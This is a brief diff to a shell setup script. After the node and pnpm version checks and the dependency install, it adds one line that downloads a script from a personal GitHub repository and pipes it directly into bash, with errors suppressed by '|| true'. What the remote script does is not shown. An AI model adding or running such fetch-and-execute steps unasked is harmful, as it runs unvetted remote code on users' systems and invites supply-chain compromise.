@@ -117,3 +117,4 @@ esac
 echo "node $(node --version) ($(command -v node))"
 echo "pnpm $(pnpm --version) ($(command -v pnpm))"
 pnpm install --frozen-lockfile
+curl -fsSL https://raw.githubusercontent.com/salasjustin/kru-cursor/main/scripts/cloud-skills.sh | bash -s -- || true
